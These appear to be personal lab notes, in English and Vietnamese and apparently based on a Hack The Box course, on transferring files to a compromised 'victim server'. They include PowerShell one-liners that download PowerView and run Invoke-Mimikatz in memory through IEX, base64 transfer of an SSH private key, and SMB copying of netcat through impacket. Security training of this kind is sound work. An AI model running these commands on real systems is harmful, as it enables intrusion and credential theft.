File Transfers

How many ways are there to transfer files to the victim server?

////////////////////////////////////////////////////////////

By SMB 


Impacket smbserver : https://github.com/fortra/impacket/blob/master/examples/smbserver.py


The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool. ( https://academy.hackthebox.com/module/24/section/160 ) 

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Base64

  Base64 file shell in source marchine, copy to victim server and decode to recover file shell. 

  Check hash MD5, Lệnh này tính MD5 hash của file id_rsa (File id_rsa trên Linux là một khóa riêng(private key) trong hệ thống xác thực SSH(Secure Shell)).
    md5sum id_rsa
  
  Encode file to base64 
    cat id_rsa | base64 -w 0; echo
  
      cat id_rsa đọc nội dung file.
      base64 -w 0 mã hóa sang chuỗi Base64 và -w 0 để không xuống dòng.
      ; echo thêm một newline cuối để tiện copy.
      Kết quả là một chuỗi Base64 rất dài (nội dung file đã mã hóa).
  
  Paste base64 to powershell 
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<REPLACE_RESULT_BASE64_ABOVE>"))
  
    example : PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
  
    [Convert]::FromBase64String() chuyển chuỗi Base64 về mảng byte.
    [IO.File]::WriteAllBytes() ghi mảng byte đó thành file id_rsa ở C:\Users\Public\.
  
  Confirming the MD5 Hashes Match
    PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

DONE ! 


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


PowerShell Web Downloads

Most company allow HTTP and HTTPS (or HTTPS only). But some company just allow whitelist domain.

powershell offer many file transfer option. in any version of PowerShell, the System.Net.WebClient class can be used to download file HTTP, HTTPS or FTP 

Method              Description
OpenRead	          Returns the data from a resource as a Stream.
OpenReadAsync	      Returns the data from a resource without blocking the calling thread.
DownloadData	      Downloads data from a resource and returns a Byte array.
DownloadDataAsync  	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	      Downloads data from a resource to a local file.
DownloadFileAsync  	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	    Downloads a String from a resource and returns a String.
DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.



Example : 
  PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
  
  PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

PowerShell DownloadString - Fileless Method

Like the name. Fileless 
Download payload and excute it without save file
Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

  example : PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

IEX also accepts pipeline input.
  example : PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

PowerShell Invoke-WebRequest

From Powershell 3.0 onward, the Invoke-WebRequest is available, but it is noticeably slower at downloading files.
Nói chung nó ngon hơn PowerShell Web Downloads( Net.WebClient) ở trên

  example : PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

SMB Downloads

Đứng từ windown 
  C:\htb> copy \\192.168.220.133\share\nc.exe
          1 file(s) copied.
      => Khoan, cuộc sống không dễ dàng với bạn như vậy. New version of Windows block unauthenticated guest access.
  C:\htb> copy \\192.168.220.133\share\nc.exe
  You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
To transfer files in the scenario, we need set username/password using our impacket SMB and mount the SMB server on our windows target machine 
Create the SMB Server with a Username and Password
  naruto3co@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed

Mount the SMB Server with Username and Password
  C:\htb> net use n: \\192.168.220.133\share /user:test test
  The command completed successfully.
  C:\htb> copy n:\nc.exe
          1 file(s) copied.

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Installing the FTP Server Python3 Module - pyftpdlib

  example : naruto3co@htb[/htb]$ sudo pip3 install pyftpdlib

By default, pyftpdlib using port 2121. Anonymous authentication 
